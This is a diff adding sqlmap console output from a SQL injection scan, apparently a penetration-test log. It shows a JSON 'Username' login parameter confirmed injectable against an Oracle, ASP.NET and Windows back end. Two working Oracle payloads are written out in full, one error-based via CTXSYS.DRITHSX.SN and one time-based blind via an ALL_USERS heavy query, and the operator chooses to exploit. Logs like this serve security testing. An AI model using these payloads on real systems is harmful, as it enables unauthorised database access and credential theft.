@@ -66,3 +66,27 @@ for the remaining tests, do you want to include all tests for 'Oracle' extending
 [08:04:21] [INFO] testing 'Oracle AND time-based blind (comment)'
 [08:04:22] [INFO] testing 'Oracle OR time-based blind (comment)'
 [08:04:22] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[08:05:22] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'Oracle AND time-based blind (heavy query)' injectable 
+[08:05:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:05:22] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 495 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: error-based
+    Title: Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)
+    Payload: {"Username":"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'","Password":"test"}
+
+    Type: time-based blind
+    Title: Oracle AND time-based blind (heavy query)
+    Payload: {"Username":"'||(SELECT CHR(110)||CHR(122)||CHR(78)||CHR(119) FROM DUAL WHERE 1671=1671 AND 6340=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5))||'","Password":"test"}
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:05:22] [INFO] the back-end DBMS is Oracle
+web server operating system: Windows
+web application technology: ASP.NET
+back-end DBMS: Oracle
+[08:05:24] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/ubuntu/.local/share/sqlmap/output/results-10092025_0800am.csv'
+
+[*] ending @ 08:05:24 /2025-10-09/
+
